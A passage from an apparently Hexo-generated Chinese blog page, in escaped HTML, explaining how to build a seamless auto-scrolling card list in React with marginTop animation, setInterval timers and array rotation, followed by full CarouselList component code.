\"hidden\"&#125;&#125;</span></span><br><span class=\"line\"><span class=\"regexp\">        /</span><span class=\"regexp\">/ onWheel=&#123;&#125;</span></span><br><span class=\"line\"><span class=\"regexp\">        &gt;</span></span><br><span class=\"line\"><span class=\"regexp\">          &lt;div style=&#123;&#123; marginTop: scrollData + \"px\" &#125;&#125;&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">            &#123;</span></span><br><span class=\"line\"><span class=\"regexp\">              dutyList.map((item, index) =&gt; &#123;</span></span><br><span class=\"line\"><span class=\"regexp\">                return (</span></span><br><span class=\"line\"><span class=\"regexp\">                  &lt;div className=\"card\" key=&#123;`$&#123;item.title&#125;:$&#123;item.name&#125;$&#123;index&#125;`&#125;&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">                    &lt;div className=\"row1\"&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">                      &lt;span&gt;&#123;item.title&#125;&amp;nbsp;&lt;/</span>span&gt;&lt;b&gt;&amp;nbsp;|&amp;nbsp;&lt;<span class=\"regexp\">/b&gt;&lt;span&gt;&#123;item.name&#125;&lt;/</span>span&gt;</span><br><span class=\"line\">                    &lt;<span class=\"regexp\">/div&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">                    &lt;div className=\"row2\"&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">                      &lt;span className=&#123;item.title.length &gt; 3 ? 'nbsp4' : 'nbsp3'&#125;&gt;电话&amp;nbsp;&lt;/</span>span&gt;&lt;b&gt;&amp;nbsp;|&amp;nbsp;&lt;<span class=\"regexp\">/b&gt;&lt;span&gt;&#123;item.phone&#125;&lt;/</span>span&gt;</span><br><span class=\"line\">                    &lt;<span class=\"regexp\">/div&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">                  &lt;/</span>div&gt;</span><br><span class=\"line\">                )</span><br><span class=\"line\">              &#125;)</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">          &lt;<span class=\"regexp\">/div&gt;</span></span><br><span class=\"line\"><span class=\"regexp\"></span></span><br><span class=\"line\"><span class=\"regexp\">        &lt;/</span>div&gt;</span><br><span class=\"line\">      &lt;<span class=\"regexp\">/div&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">    )</span></span><br><span class=\"line\"><span class=\"regexp\">  &#125;</span></span><br><span class=\"line\"><span class=\"regexp\">&#125;</span></span><br><span class=\"line\"><span class=\"regexp\"></span></span><br><span class=\"line\"><span class=\"regexp\">export default InformationOnDuty;</span></span><br></pre></td></tr></table></figure></p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"无缝滚动\"><a href=\"#无缝滚动\" class=\"headerlink\" title=\"无缝滚动\"></a>无缝滚动</h2><h3 id=\"第一步-定义-Dom结构\"><a href=\"#第一步-定义-Dom结构\" class=\"headerlink\" title=\"第一步 定义 Dom结构\"></a>第一步 定义 Dom结构</h3><ul>\n<li>第一层<code>div</code>最外侧 负责 1️⃣鼠标 交互，2️⃣超出隐藏</li>\n<li>第二层<code>div</code>负责整体动画，通过<code>marginTop</code>属性实现动画效果<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span></span></span><br><span class=\"line\"><span class=\"tag\">  <span class=\"attr\">className</span>=<span class=\"string\">\"contetn\"</span></span></span><br><span class=\"line\"><span class=\"tag\">  <span class=\"attr\">ref</span>=<span class=\"string\">\"content\"</span> // <span class=\"attr\">react</span>中 通过 <span class=\"attr\">this.refs.content</span> 获取 <span class=\"attr\">Dom</span>元素</span></span><br><span class=\"line\"><span class=\"tag\">  <span class=\"attr\">onMouseEnter</span>=<span class=\"string\">&#123;this.removeAnimationInterval&#125;</span> // 鼠标移入 清除定时器</span></span><br><span class=\"line\"><span class=\"tag\">  <span class=\"attr\">onMouseLeave</span>=<span class=\"string\">&#123;this.animationInterval&#125;</span> // 鼠标移出 设置定时器</span></span><br><span class=\"line\"><span class=\"tag\">  <span class=\"attr\">style</span>=<span class=\"string\">&#123;&#123;overflow:</span> \"<span class=\"attr\">hidden</span>\"&#125;&#125; // 超出隐藏 多余内容</span></span><br><span class=\"line\"><span class=\"tag\">  // <span class=\"attr\">onWheel</span>=<span class=\"string\">&#123;&#125;</span> // 鼠标滚轴 事件</span></span><br><span class=\"line\"><span class=\"tag\">&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">style</span>=<span class=\"string\">&#123;&#123;</span> <span class=\"attr\">marginTop:</span> <span class=\"attr\">scrollData</span> + \"<span class=\"attr\">px</span>\" &#125;&#125;&gt;</span> // 通过`marginTop`属性实现动画效果</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      dutyList.map((item, index) =&gt; &#123;</span><br><span class=\"line\">        return (</span><br><span class=\"line\">          <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">className</span>=<span class=\"string\">\"card\"</span> <span class=\"attr\">key</span>=<span class=\"string\">&#123;</span>`$&#123;<span class=\"attr\">item.title</span>&#125;<span class=\"attr\">:</span>$&#123;<span class=\"attr\">item.name</span>&#125;$&#123;<span class=\"attr\">index</span>&#125;`&#125;&gt;</span></span><br><span class=\"line\">            内部元素 非 动画效果 关键，可自定义内容</span><br><span class=\"line\">          <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        )</span><br><span class=\"line\">      &#125;)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h3 id=\"第二步-获取数据-利用周期执行动画\"><a href=\"#第二步-获取数据-利用周期执行动画\" class=\"headerlink\" title=\"第二步 获取数据 利用周期执行动画\"></a>第二步 获取数据 利用周期执行动画</h3><p>在请求数据的回调函数 中 设置state, 利用回调 执行 动画方法<br><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">getOnDutyListData() &#123;</span><br><span class=\"line\">  axios(&#123;</span><br><span class=\"line\">    method: <span class=\"string\">'GET'</span>,</span><br><span class=\"line\">    url: <span class=\"string\">`/OnDutyList`</span>,</span><br><span class=\"line\">  &#125;).then(<span class=\"function\"><span class=\"params\">res</span> =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.setState(&#123;</span><br><span class=\"line\">      dutyList: res.data.result</span><br><span class=\"line\">    &#125;, <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> <span class=\"keyword\">this</span>.animationInterval()) <span class=\"comment\">// 在这里，利用 回调 执行 动画方法。可以避免 在其他 周期里面获取不到 异步数据的情况</span></span><br><span class=\"line\">  &#125;)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"第三步-动画实现效果\"><a href=\"#第三步-动画实现效果\" class=\"headerlink\" title=\"第三步 动画实现效果\"></a>第三步 动画实现效果</h3><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">animationInterval() &#123;</span><br><span class=\"line\">  <span class=\"comment\">/** 获取滚动系数, 数据矩阵 */</span></span><br><span class=\"line\">  <span class=\"keyword\">let</span> &#123; scrollData, dutyList &#125; = <span class=\"keyword\">this</span>.state;</span><br><span class=\"line\">  <span class=\"comment\">/** 非空判断 */</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!dutyList.length) <span class=\"keyword\">return</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/** 设置定时器，挂载到 当前类下的 state */</span></span><br><span class=\"line\">  <span class=\"keyword\">this</span>.state.animationInterval = setInterval(<span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">/** setState触发render，实现实时动画效果 */</span></span><br><span class=\"line\">    <span class=\"keyword\">this</span>.setState(&#123;</span><br><span class=\"line\">      scrollData: scrollData--</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/** 初始化判断 */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.state.inital &amp;&amp; scrollData === <span class=\"number\">-1</span>) &#123;</span><br><span class=\"line\">      dutyList.push(dutyList[<span class=\"number\">0</span>]); <span class=\"comment\">// 第一次多加载 一个 数据第一项，实现首尾无缝滚动 </span></span><br><span class=\"line\">      <span class=\"keyword\">this</span>.setState(&#123;</span><br><span class=\"line\">        inital: <span class=\"literal\">false</span> <span class=\"comment\">// 关闭 初始化</span></span><br><span class=\"line\">      &#125;)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/** 判断 滚动位置 128为当前效果 中 itemCard 高度, 一但card全部高度 超出视图 执行内部语句 */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (scrollData % <span class=\"number\">128</span> === <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">      dutyList.shift(); <span class=\"comment\">// 删除第一项</span></span><br><span class=\"line\">      dutyList.push(dutyList[<span class=\"number\">0</span>]); <span class=\"comment\">// 把当前 数据 第一项，加入 矩阵尾部</span></span><br><span class=\"line\">      scrollData = <span class=\"number\">0</span>; <span class=\"comment\">// 并把 高度 重置</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// if (scrollData &gt; -113) &#123;</span></span><br><span class=\"line\">    <span class=\"comment\">//   let firstItem = dutyList[0];</span></span><br><span class=\"line\">    <span class=\"comment\">//   // dutyList.shift();</span></span><br><span class=\"line\">    <span class=\"comment\">//   // dutyList.push(firstItem);</span></span><br><span class=\"line\">    <span class=\"comment\">//   this.setState(&#123;</span></span><br><span class=\"line\">    <span class=\"comment\">//     scrollData: scrollData--</span></span><br><span class=\"line\">    <span class=\"comment\">//   &#125;)</span></span><br><span class=\"line\">    <span class=\"comment\">// &#125; else &#123;</span></span><br><span class=\"line\">    <span class=\"comment\">//   scrollData = 0;</span></span><br><span class=\"line\">    <span class=\"comment\">//   let firstItem = dutyList[0];</span></span><br><span class=\"line\">    <span class=\"comment\">//   dutyList.shift();</span></span><br><span class=\"line\">    <span class=\"comment\">//   dutyList.push(firstItem);</span></span><br><span class=\"line\">    <span class=\"comment\">// &#125;</span></span><br><span class=\"line\">  &#125;, <span class=\"number\">50</span>)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>操作重点</strong></p>\n<ul>\n<li>数组操作: 1️⃣<code>shift()</code>, 2️⃣<code>push(dutyList[0])</code></li>\n<li>react: <code>setState</code></li>\n</ul>\n<h3 id=\"第四步-鼠标移入移出-组件卸载-清除定时器\"><a href=\"#第四步-鼠标移入移出-组件卸载-清除定时器\" class=\"headerlink\" title=\"第四步 鼠标移入移出/ 组件卸载 清除定时器\"></a>第四步 <code>鼠标移入移出/ 组件卸载</code> 清除定时器</h3><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">removeAnimationInterval() &#123;</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.state.animationInterval &amp;&amp; clearInterval(<span class=\"keyword\">this</span>.state.animationInterval);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">componenWillUnmount() &#123;</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.removeAnimationInterval();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"附录-完整代码\"><a href=\"#附录-完整代码\" class=\"headerlink\" title=\"附录 完整代码\"></a>附录 完整代码</h2><p><strong>CarouselList.js</strong><br><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> <span class=\"keyword\">class</span> CarouselList <span class=\"keyword\">extends</span> Component &#123;</span><br><span class=\"line\">    <span class=\"keyword\">constructor</span>(<span class=\"params\">props</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">super</span>(props);</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.state = &#123;</span><br><span class=\"line\">            data: <span class=\"keyword\">this</span>.props.data,</span><br><span class=\"line\">            scrollData: <span class=\"number\">0</span></span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    componentDidMount = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.addHandleTimer();</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    componentWillUnmount = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.removeHandleTimer();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//timers</span></span><br><span class=\"line\">    addHandleTimer = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">let</span> &#123; data, scrollData &#125; = <span class=\"keyword\">this</span>.state;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!data || !data.length) <span class=\"keyword\">return</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.timer = setInterval(<span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (scrollData &gt; <span class=\"number\">-27</span>) &#123;</span><br><span class=\"line\">                scrollData--;</span><br><span class=\"line\">                <span class=\"keyword\">this</span>.setState(&#123;</span><br><span class=\"line\">                    scrollData: scrollData</span><br><span class=\"line\">                &#125;)</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                scrollData = <span class=\"number\">0</span>;</span><br><span class=\"line\">                <span class=\"keyword\">let</span> firstData = data[<span class=\"number\">0</span>];</span><br><span class=\"line\">                data.shift();</span><br><span class=\"line\">                data.push(firstData);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;, <span class=\"number\">70</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    removeHandleTimer = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.timer &amp;&amp; clearInterval(<span class=\"keyword\">this</span>.timer);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    handleScroll = <span class=\"function\"><span class=\"params\">e</span> =&gt;</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">const</span> ev = e || <span class=\"built_in\">window</span>.event;</span><br><span class=\"line\">        e.preventDefault();</span><br><span class=\"line\">        <span class=\"keyword\">const</span> conDom = <span class=\"keyword\">this</span>.refs[<span class=\"string\">\"content\"</span>];</span><br><span class=\"line\">        <span class=\"keyword\">const</span> speed = <span class=\"number\">5</span>; <span class=\"comment\">// scroll speed</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (ev.deltaY &gt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">            conDom.scrollTop += speed;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            conDom.scrollTop -= speed;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    render() &#123;</span><br><span class=\"line\">        <span class=\"keyword\">const</span> &#123; data, scrollData &#125; = <span class=\"keyword\">this</span>.state;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> (</span><br><span class=\"line\">            &lt;div</span><br><span class=\"line\">                ref=<span class=\"string\">\"content\"</span></span><br><span class=\"line\">                onMouseEnter=&#123;<span class=\"keyword\">this</span>.removeHandleTimer&#125;</span><br><span class=\"line\">                onMouseLeave=&#123;<span class=\"keyword\">this</span>.addHandleTimer&#125;</span><br><span class=\"line\">                onWheel=&#123;<span class=\"keyword\">this</span>.handleScroll&#125;</span><br><span class=\"line\">            &gt;</span><br><span class=\"line\">                &lt;ul style=&#123;&#123; marginTop: scrollData + <span class=\"string\">\"px\"</span> &#125;&#125;&gt;</span><br><span class=\"line\">                    &#123;</span><br><span class=\"line\">                        data.length &gt; <span class=\"number\">0</span> &amp;&amp; data.map(<span class=\"function\">(<span class=\"params\">item, index</span>) =&gt;</span> &#123;</span><br><span class=\"line\">                            <span class=\"keyword\">return</span> (</span><br><span class=\"line\">                                <span class=\"keyword\">this</span>.props.type === <span class=\"string\">'simple'</span> ?</span><br><span class=\"line\">                                    &lt;li key=&#123;index&#125;&gt;&lt;p title=&#123;item.value&#125;&gt;&#123;item.value&#125;&lt;<span class=\"regexp\">/p&gt;&lt;/</span>li&gt;</span><br><span class=\"line\">                                    : &lt;li key=&#123;index&#125;&gt;&lt;span&gt;&#123;item.id&#125;&lt;<span class=\"regexp\">/span&gt;&lt;p title=&#123;item.intelligence&#125;&gt;&#123;item.intelligence&#125;&lt;/</span>p&gt;&lt;<span class=\"regexp\">/li&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">                            )</span></span><br><span class=\"line\"><span class=\"regexp\">                            /</span><span class=\"regexp\">/ 默认：complex</span></span><br><span class=\"line\"><span class=\"regexp\">                            &#123;/</span>*&lt;li key=&#123;index&#125;&gt;&lt;span&gt;&#123;item.id&#125;&lt;<span class=\"regexp\">/span&gt;&lt;p title=&#123;item.intelligence&#125;&gt;&#123;item.intelligence&#125;&lt;/</span>p&gt;&lt;<span class=\"regexp\">/li&gt;*/</span> &#125;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                        )</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &lt;<span class=\"regexp\">/ul&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">            &lt;/</span>div&gt;</span><br><span class=\"line\">        );</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><strong>CarouselList2.js</strong><br><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> <span class=\"keyword\">class</span> CarouselList2 <span class=\"keyword\">extends</span> Component &#123;</span><br><span class=\"line\">    <span class=\"keyword\">constructor</span>(<span class=\"params\">props</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">super</span>(props);</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(<span class=\"string\">'是大法官'</span>,<span class=\"keyword\">this</span>.props.data)</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.state = &#123;</span><br><span class=\"line\">            data: <span class=\"keyword\">this</span>.props.data,</span><br><span class=\"line\">            scrollData: <span class=\"number\">0</span></span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    componentDidMount = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.addHandleTimer();</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    componentWillUnmount = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.removeHandleTimer();</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    <span class=\"comment\">//timers</span></span><br><span class=\"line\">    addHandleTimer = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">let</span> &#123;data, scrollData&#125; = <span class=\"keyword\">this</span>.state;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!data || !data.length) <span class=\"keyword\">return</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(data.length &lt; <span class=\"number\">5</span> ) <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.timer = setInterval(<span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (scrollData &gt; <span class=\"number\">-52</span>) &#123;</span><br><span class=\"line\">                scrollData--;</span><br><span class=\"line\">                <span class=\"keyword\">this</span>.setState(&#123;</span><br><span class=\"line\">                    scrollData: scrollData</span><br><span class=\"line\">                &#125;)</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                scrollData = <span class=\"number\">0</span>;</span><br><span class=\"line\">                <span class=\"keyword\">let</span> firstData = data[<span class=\"number\">0</span>];</span><br><span class=\"line\">                data.shift();</span><br><span class=\"line\">                data.push(firstData);</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"keyword\">let</span> firstData1 = data[<span class=\"number\">0</span>];</span><br><span class=\"line\">                data.shift();</span><br><span class=\"line\">                data.push(firstData1);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;, <span class=\"number\">70</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    removeHandleTimer = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.timer &amp;&amp; clearInterval(<span class=\"keyword\">this</span>.timer);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    handleScroll = <span class=\"function\"><span class=\"params\">e</span> =&gt;</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">const</span> ev = e || <span class=\"built_in\">window</span>.event;</span><br><span class=\"line\">        e.preventDefault();</span><br><span class=\"line\">        <span class=\"keyword\">const</span> conDom = <span class=\"keyword\">this</span>.refs[<span class=\"string\">\"content\"</span>];</span><br><span class=\"line\">        <span class=\"keyword\">const</span> speed = <span class=\"number\">6</span>; <span class=\"comment\">// scroll speed</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (ev.deltaY &gt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">            conDom.scrollTop += speed;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            conDom.scrollTop -= speed;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    render() &#123;</span><br><span class=\"line\">        <span class=\"keyword\">const</span> &#123;data, scrollData&#125; = <span 